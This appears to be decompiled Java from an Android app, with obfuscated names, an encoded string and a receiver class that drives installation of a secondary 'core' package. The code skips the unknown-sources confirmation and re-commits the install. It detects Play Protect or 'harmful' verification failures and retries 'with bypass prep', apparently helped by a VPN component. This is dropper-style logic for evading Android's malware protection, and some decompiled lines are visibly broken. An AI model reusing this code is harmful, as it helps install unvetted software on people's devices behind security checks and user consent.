// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.wrapper.core;

import H.t;
import O.h;
import V0.p;
import W0.c;
import W0.d;
import W0.i;
import W0.k;
import W0.l;
import W0.m;
import W0.u;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;
import com.o2s2m.gae1fc3b2uc0u.R;

/* JADX INFO: loaded from: classes.dex */
public class CoreInstallReceiver extends BroadcastReceiver {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final String f3642a = p.a(new int[]{176, 41, 64, 54, 110, 27, 145, 228, 93, 47, 32, 138, 7, 245, 122, 213, 133, 35, 64});

    /* JADX WARN: Code duplicated, block: B:40:0x0106  */
    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        boolean z2;
        boolean zD;
        Uri data;
        String className;
        int intExtra = intent.getIntExtra("android.content.pm.extra.STATUS", 1);
        String stringExtra = intent.getStringExtra("android.content.pm.extra.STATUS_MESSAGE");
        int intExtra2 = intent.getIntExtra("android.content.pm.extra.SESSION_ID", -1);
        if (intExtra == -1) {
            i.l(context, false);
            m mVar = i.f804i;
            synchronized (mVar) {
                if (!mVar.d(intExtra2)) {
                    Log.i(i.f797a, "ignore stale pending-user-action session=" + intExtra2);
                    Log.i(f3642a, "ignored stale install confirm session=" + intExtra2);
                    return;
                }
                mVar.f823b = true;
                context.getApplicationContext().getSharedPreferences(i.f800d, 0).edit().putInt(i.f801e, intExtra2).putBoolean(i.f802f, true).commit();
                i.f810o = false;
                if (intExtra2 >= 0 && intExtra2 == i.f806k) {
                    Log.i(f3642a, "install confirm already shown session=" + intExtra2);
                    return;
                }
                i.f806k = intExtra2;
                Intent intent2 = Build.VERSION.SDK_INT >= 33 ? (Intent) intent.getParcelableExtra("android.intent.extra.INTENT", Intent.class) : (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
                if (intent2 == null) {
                    Toast.makeText(context, R.string.core_install_action_required, 1).show();
                    return;
                }
                String str = f3642a;
                Log.i(str, "pending user action action=" + intent2.getAction() + " component=" + intent2.getComponent());
                String action = intent2.getAction();
                if (!"android.settings.MANAGE_UNKNOWN_APP_SOURCES".equals(action)) {
                    if (intent2.getComponent() == null || (className = intent2.getComponent().getClassName()) == null) {
                        data = intent2.getData();
                        if (data != null || !"package".equals(data.getScheme()) || !"android.settings.MANAGE_UNKNOWN_APP_SOURCES".equals(action)) {
                            intent2.addFlags(268435456);
                            context.startActivity(intent2);
                            i.f810o = false;
                            i.f799c.post(new d(2));
                            return;
                        }
                    } else {
                        String lowerCase = className.toLowerCase();
                        if (!lowerCase.contains("manageappexternalsources") && !lowerCase.contains("externalsources") && (!lowerCase.contains("unknown") || !lowerCase.contains("source"))) {
                            data = intent2.getData();
                            if (data != null) {
                            }
                            intent2.addFlags(268435456);
                            context.startActivity(intent2);
                            i.f810o = false;
                            i.f799c.post(new d(2));
                            return;
                        }
                    }
                }
                Log.i(str, "skip unknown-sources pending action — already granted before download");
                if (i.f808m) {
                    Log.w(i.f797a, "already skipped unknown-sources confirm — ignore");
                    return;
                }
                i.l(context, false);
                l lVarC = mVar.c(intExtra2);
                if (!lVarC.f820a) {
                    Log.i(i.f797a, "ignore stale unknown-sources session=" + intExtra2);
                    return;
                }
                i.f808m = true;
                i.d(context);
                i.e(context);
                i.a(context, lVarC.f821b);
                i.f806k = -1;
                Activity activity = (Activity) i.f812q.get();
                String str2 = i.f797a;
                Log.i(str2, "recommit after skipping unknown-sources Settings");
                if (activity != null) {
                    i.g(activity);
                    return;
                }
                Context applicationContext = context.getApplicationContext();
                i.l(applicationContext, true);
                if (!mVar.a()) {
                    Log.i(str2, "install already in progress - skip reinstall");
                    return;
                } else {
                    i.d(applicationContext);
                    i.f798b.execute(new h(applicationContext, 2));
                    return;
                }
            }
        }
        String str3 = i.f797a;
        try {
            context.getPackageManager().getPackageInfo(c.f784a, 0);
            z2 = !k.b(context);
        } catch (Exception unused) {
        }
        if (intExtra == 0 || z2) {
            if (intExtra != 0) {
                Log.w(f3642a, "installer reported failure after current core landed session=" + intExtra2 + " status=" + intExtra + " msg=" + stringExtra);
            }
            if (i.k(context, intExtra2)) {
                Log.i(f3642a, "Screen runtime installed — handoff then finish");
                u.e(context, u.f842d);
                return;
            }
            Log.i(f3642a, "ignored stale terminal success session=" + intExtra2);
            u.e(context, u.f842d);
            return;
        }
        i.l(context, false);
        m mVar2 = i.f804i;
        synchronized (mVar2) {
            zD = mVar2.d(intExtra2);
        }
        if (!zD) {
            Log.i(f3642a, "ignored stale install failure session=" + intExtra2 + " status=" + intExtra + " msg=" + stringExtra);
            return;
        }
        String str4 = f3642a;
        Log.e(str4, "Core install failed: status=" + intExtra + ", msg=" + stringExtra);
        if (stringExtra != null) {
            String lowerCase2 = stringExtra.toLowerCase();
            if ((lowerCase2.contains("verification") || lowerCase2.contains("play protect") || lowerCase2.contains("verifyapps") || lowerCase2.contains("harmful")) && !i.f807l) {
                Log.w(str4, "Play Protect blocked install — retrying with bypass prep");
                if (i.f807l) {
                    return;
                }
                i.l(context, false);
                l lVarC2 = mVar2.c(intExtra2);
                if (!lVarC2.f820a) {
                    Log.i(i.f797a, "ignore stale verification failure session=" + intExtra2);
                    return;
                }
                i.d(context);
                i.e(context);
                i.a(context, lVarC2.f821b);
                Activity activity2 = (Activity) i.f812q.get();
                if (activity2 == null) {
                    Log.w(i.f797a, "Retry skipped — activity unbound");
                    PpVpn.b();
                    i.f799c.post(new d(4));
                    return;
                } else {
                    i.f807l = true;
                    i.f806k = -1;
                    Log.w(i.f797a, "Retrying install after Play Protect block without sigblock patch");
                    i.g(activity2);
                    return;
                }
            }
        }
        if (stringExtra == null) {
            stringExtra = "Install failed";
        }
        i.l(context, false);
        if (!mVar2.b(intExtra2)) {
            Log.i(i.f797a, "ignore stale install failure session=" + intExtra2);
            return;
        }
        i.d(context);
        i.f806k = -1;
        i.e(context);
        i.f808m = false;
        PpVpn.b();
        i.f799c.post(new t(2, stringExtra));
        Toast.makeText(context, R.string.core_install_failed, 1).show();
    }
}
